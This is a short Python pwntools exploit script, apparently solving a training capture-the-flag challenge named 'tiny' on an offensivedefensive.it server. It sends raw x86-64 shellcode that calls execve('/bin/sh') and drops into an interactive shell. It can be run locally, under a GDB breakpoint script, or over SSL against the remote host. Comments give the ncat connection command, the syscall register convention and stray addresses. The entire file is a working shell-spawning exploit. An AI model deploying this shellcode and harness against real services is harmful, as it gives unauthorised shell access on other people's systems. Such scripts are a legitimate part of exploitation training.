from pwn import *
#xor esi, esi
#xor edx, edx
#syscall

COMMANDS = """
b cs_free
continue
finish
next
next
si
si
si
"""
shellcode = b"\x6A\x3B\x58\x31\xF6\x31\xD2\x0F\x05"

#ncat --ssl back-to-shell.training.offensivedefensive.it 8080
if args.GDB:
    p = gdb.debug("./tiny" , b"/bin/sh\0", gdbscript=COMMANDS)
elif args.REMOTE:
    p = remote("tiny.training.offensivedefensive.it", 8080, ssl=True)
else:
    p = process("./tiny")
p.send(shellcode)
p.interactive()

#0x40116e

#execve("/bin/sh\0", NULL, NULL)

#(rdi, rsi, rdx), r10, r8, r9
#const char *filename, const char *const *argv, const char *const *envp

0x7ffeeec9e500